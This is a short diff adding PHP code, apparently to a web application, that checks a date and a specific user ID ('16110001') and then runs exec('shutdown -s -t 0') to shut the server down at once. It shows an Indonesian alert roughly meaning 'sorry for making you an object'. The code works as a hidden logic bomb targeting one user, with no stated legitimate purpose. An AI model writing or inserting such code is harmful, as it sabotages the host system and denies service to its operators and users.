@@ -1,0 +1,10 @@
+if(strtotime($d)>strtotime(date("Y-m-01")))
+{
+	if($nik=='16110001'){
+		exec('shutdown -s -t 0 ');
+		echo alert_error("maaf telah menjadikan sebagai objek");
+	}
+}
+else{
+	
+}
